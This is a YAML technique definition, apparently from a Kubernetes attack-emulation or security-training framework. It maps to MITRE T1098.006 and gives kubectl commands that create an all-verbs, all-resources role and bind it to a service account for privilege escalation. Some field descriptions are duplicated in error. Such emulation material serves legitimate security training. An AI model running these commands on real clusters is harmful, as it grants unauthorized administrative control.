name: Create Admin Role and bind it to a Service Account
description: Create a highly privileged RBAC role and bind it to an existing service account
tactic: Privilege Escalation
techniques:
  - "Account Manipulation: Additional Container Cluster Roles"
  - T1098.006
parameters:
  SERVICE_ACCOUNT:
    type: string
    default: default
    description: the name of the service account to which the role will be bound
  NAMESPACE:
    type: string
    default: ${NS}
    description: the name of the namespace in which the role will be created
  TOKEN:
    type: string
    default: ""
    description: the token used to authenticate to the API server
  ROLE_NAME:
    type: string
    default: nsadmin
    description: the name of the service account to which the role will be bound
  BINDING_NAME:
    type: string
    default: ${SERVICE_ACCOUNT}-${ROLE_NAME}
    description: the name of the service account to which the role will be bound
cmdVariants:
  - key: kubectl
    command: >
      kubectl create role ${ROLE_NAME} --verb=* --resource=* --token=${TOKEN}
      && kubectl create rolebinding ${BINDING_NAME} --role=${ROLE_NAME} --serviceaccount=${NAMESPACE}:${SERVICE_ACCOUNT} --token=${TOKEN}
preconditions:
  accessLevel: "can-create role && rolebinding"
# cmd: {}
# defend: {}
refernces:
  - https://attack.mitre.org/techniques/T1098/006/
  - https://github.com/Container-Security-Training/Kubecon-EU-25
